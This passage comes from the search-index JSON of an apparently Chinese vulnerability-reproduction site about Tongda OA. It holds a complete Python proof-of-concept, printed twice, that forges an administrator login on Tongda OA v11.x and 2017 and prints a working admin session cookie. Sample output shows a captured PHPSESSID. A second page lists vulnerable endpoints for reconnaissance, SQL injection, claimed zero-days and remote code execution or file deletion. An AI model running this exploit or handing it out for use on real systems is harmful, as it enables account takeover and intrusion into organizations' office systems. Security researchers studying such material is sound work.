Sqlmap\u8dd1\u4e00\u4e0b","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/","text":"\u901a\u8fbeOA v11.x-v11.5\u4efb\u610f\u7528\u6237\u767b\u5f55 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA\u662f\u4e00\u5957\u529e\u516c\u7cfb\u7edf\u30022020\u5e7404\u670817\u65e5, \u901a\u8fbeOA\u5b98\u65b9\u5728\u66f4\u65b0\u4e86\u4e00\u4e2av11\u7248\u672c\u5b89\u5168\u8865\u4e01, \u5176\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2a\u4efb\u610f\u7528\u6237\u4f2a\u9020\u767b\u5f55\u6f0f\u6d1e\u3002 \u8be5\u6f0f\u6d1e\u7c7b\u578b\u4e3a\u4efb\u610f\u7528\u6237\u4f2a\u9020\uff0c\u672a\u7ecf\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u4efb\u610f\u7528\u6237\u4f2a\u9020\u767b\u5f55\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA\u7248\u672c V11.X < V11.5 \u73af\u5883\u642d\u5efa \u00b6 \u6f0f\u6d1e\u73af\u5883\u4e0b\u8f7d https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe \u53cc\u51fb\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528 POC \u83b7\u53d6\u7ba1\u7406\u5458\u7684Cookie root@kali:~/\u684c\u9762# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ \u6210\u529f\u83b7\u5f97Cookie,\u6dfb\u52a0Cookie\u8bbf\u95ee ** http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0 **\u5373\u53ef \u6f0f\u6d1e\u5229\u7528POC \u00b6 ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\" , \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\" , \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\" , \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\" , \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\" , \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\" , \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\" , \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\" , \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\" , \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\" , \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\" , \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\" , \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\" , \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers = {} def getV11Session ( url ): checkUrl = url + '/general/login_code.php' try : headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) res = requests . get ( checkUrl , headers = headers ) resText = str ( res . text ) . split ( '{' ) codeUid = resText [ - 1 ] . replace ( '}\"}' , '' ) . replace ( ' \\r\\n ' , '' ) getSessUrl = url + '/logincheck_code.php' res = requests . post ( getSessUrl , data = { 'CODEUID' : '{' + codeUid + '}' , 'UID' : int ( 1 )}, headers = headers ) tmp_cookie = res . headers [ 'Set-Cookie' ] headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) headers [ \"Cookie\" ] = tmp_cookie check_available = requests . get ( url + '/general/index.php' , headers = headers ) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available . text : if '\u91cd\u65b0\u767b\u5f55' not in check_available . text : print ( '[+]Get Available COOKIE:' + tmp_cookie ) else : print ( '[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.' ) except : print ( '[-]Something Wrong With ' + url ) def get2017Session ( url ): checkUrl = url + '/ispirit/login_code.php' try : headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) res = requests . get ( checkUrl , headers = headers ) resText = json . loads ( res . text ) codeUid = resText [ 'codeuid' ] codeScanUrl = url + '/general/login_code_scan.php' res = requests . post ( codeScanUrl , data = { 'codeuid' : codeUid , 'uid' : int ( 1 ), 'source' : 'pc' , 'type' : 'confirm' , 'username' : 'admin' }, headers = headers ) resText = json . loads ( res . text ) status = resText [ 'status' ] if status == str ( 1 ): getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid res = requests . get ( getCodeUidUrl ) tmp_cookie = res . headers [ 'Set-Cookie' ] headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) headers [ \"Cookie\" ] = tmp_cookie check_available = requests . get ( url + '/general/index.php' , headers = headers ) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available . text : if '\u91cd\u65b0\u767b\u5f55' not in check_available . text : print ( '[+]Get Available COOKIE:' + tmp_cookie ) else : print ( '[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.' ) else : print ( '[-]Something Wrong With ' + url + ' Maybe Not Vulnerable ?' ) except : print ( '[-]Something Wrong With ' + url ) if __name__ == \"__main__\" : parser = argparse . ArgumentParser () parser . add_argument ( \"-v\" , \"--tdoaversion\" , type = int , choices = [ 11 , 2017 ], help = \"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\" ) parser . add_argument ( \"-url\" , \"--targeturl\" , type = str , help = \"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser . parse_args () url = args . targeturl if 'http://' not in url : url = 'http://' + url if args . tdoaversion == 11 : getV11Session ( url ) elif args . tdoaversion == 2017 : get2017Session ( url ) else : parser . print_help ()","title":"\u901a\u8fbeOA v11.x-v11.5\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u901a\u8fbeoa-v11x-v115\u4efb\u610f\u7528\u6237\u767b\u5f55","text":"","title":"\u901a\u8fbeOA v11.x-v11.5\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u901a\u8fbeOA\u662f\u4e00\u5957\u529e\u516c\u7cfb\u7edf\u30022020\u5e7404\u670817\u65e5, \u901a\u8fbeOA\u5b98\u65b9\u5728\u66f4\u65b0\u4e86\u4e00\u4e2av11\u7248\u672c\u5b89\u5168\u8865\u4e01, \u5176\u4e2d\u4fee\u590d\u4e86\u4e00\u4e2a\u4efb\u610f\u7528\u6237\u4f2a\u9020\u767b\u5f55\u6f0f\u6d1e\u3002 \u8be5\u6f0f\u6d1e\u7c7b\u578b\u4e3a\u4efb\u610f\u7528\u6237\u4f2a\u9020\uff0c\u672a\u7ecf\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u4efb\u610f\u7528\u6237\u4f2a\u9020\u767b\u5f55\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA\u7248\u672c V11.X < V11.5","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u73af\u5883\u642d\u5efa","text":"\u6f0f\u6d1e\u73af\u5883\u4e0b\u8f7d https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe \u53cc\u51fb\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4f7f\u7528 POC \u83b7\u53d6\u7ba1\u7406\u5458\u7684Cookie root@kali:~/\u684c\u9762# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ \u6210\u529f\u83b7\u5f97Cookie,\u6dfb\u52a0Cookie\u8bbf\u95ee ** http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0 **\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.x-v11.5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/#\u6f0f\u6d1e\u5229\u7528poc","text":"''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\" , \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\" , \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\" , \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\" , \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\" , \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\" , \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\" , \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\" , \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\" , \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\" , \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\" , \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\" , \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\" , \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\" , \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\" , \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\" , \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\" , \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\" , \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers = {} def getV11Session ( url ): checkUrl = url + '/general/login_code.php' try : headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) res = requests . get ( checkUrl , headers = headers ) resText = str ( res . text ) . split ( '{' ) codeUid = resText [ - 1 ] . replace ( '}\"}' , '' ) . replace ( ' \\r\\n ' , '' ) getSessUrl = url + '/logincheck_code.php' res = requests . post ( getSessUrl , data = { 'CODEUID' : '{' + codeUid + '}' , 'UID' : int ( 1 )}, headers = headers ) tmp_cookie = res . headers [ 'Set-Cookie' ] headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) headers [ \"Cookie\" ] = tmp_cookie check_available = requests . get ( url + '/general/index.php' , headers = headers ) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available . text : if '\u91cd\u65b0\u767b\u5f55' not in check_available . text : print ( '[+]Get Available COOKIE:' + tmp_cookie ) else : print ( '[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.' ) except : print ( '[-]Something Wrong With ' + url ) def get2017Session ( url ): checkUrl = url + '/ispirit/login_code.php' try : headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) res = requests . get ( checkUrl , headers = headers ) resText = json . loads ( res . text ) codeUid = resText [ 'codeuid' ] codeScanUrl = url + '/general/login_code_scan.php' res = requests . post ( codeScanUrl , data = { 'codeuid' : codeUid , 'uid' : int ( 1 ), 'source' : 'pc' , 'type' : 'confirm' , 'username' : 'admin' }, headers = headers ) resText = json . loads ( res . text ) status = resText [ 'status' ] if status == str ( 1 ): getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid res = requests . get ( getCodeUidUrl ) tmp_cookie = res . headers [ 'Set-Cookie' ] headers [ \"User-Agent\" ] = choice ( USER_AGENTS ) headers [ \"Cookie\" ] = tmp_cookie check_available = requests . get ( url + '/general/index.php' , headers = headers ) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available . text : if '\u91cd\u65b0\u767b\u5f55' not in check_available . text : print ( '[+]Get Available COOKIE:' + tmp_cookie ) else : print ( '[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.' ) else : print ( '[-]Something Wrong With ' + url + ' Maybe Not Vulnerable ?' ) except : print ( '[-]Something Wrong With ' + url ) if __name__ == \"__main__\" : parser = argparse . ArgumentParser () parser . add_argument ( \"-v\" , \"--tdoaversion\" , type = int , choices = [ 11 , 2017 ], help = \"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\" ) parser . add_argument ( \"-url\" , \"--targeturl\" , type = str , help = \"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser . parse_args () url = args . targeturl if 'http://' not in url : url = 'http://' + url if args . tdoaversion == 11 : getV11Session ( url ) elif args . tdoaversion == 2017 : get2017Session ( url ) else : parser . print_help ()","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/","text":"\u901a\u8fbeOA\u90e8\u5206\u6f0f\u6d1e\u4fe1\u606f\u6574\u5408 \u00b6 \u901a\u8fbeOA\u4fe1\u606f\u6536\u96c6 \u00b6 http[s]://TongDaOA.domain/inc/expired.php \u5224\u65ad\u901a\u8fbe\u7248\u672c http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET \u53c2\u6570username\u3001email \u53ef\u7206\u7528\u6237\u3001\u90ae\u7bb1 http[s]://TongDaOA.domain/resque/worker.php \u8ba1\u7b97\u673a\u540d 2013-2017(SQLi path) \u00b6 http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] \u00b6 http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] \u00b6 http[s]://TongDaOA.domain/module/appbuilder/assets/print.php \u4efb\u610f\u6587\u4ef6\u5220\u9664 \u53c2\u8003\u6587\u7ae0 \u00b6 \u901a\u8fbeOA\u6f0f\u6d1e\u4e00\u4e9b\u6f0f\u6d1e\u70b9(Github)","title":"\u901a\u8fbeOA\u90e8\u5206\u6f0f\u6d1e\u4fe1\u606f\u6574\u5408"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#\u901a\u8fbeoa\u90e8\u5206\u6f0f\u6d1e\u4fe1\u606f\u6574\u5408","text":"","title":"\u901a\u8fbeOA\u90e8\u5206\u6f0f\u6d1e\u4fe1\u606f\u6574\u5408"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/#\u901a\u8fbeoa\u4fe1\u606f\u6536\u96c6","text":"http[s]://TongDaOA.domain/inc/expired.php \u5224\u65ad\u901a\u8fbe\u7248\u672c http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET 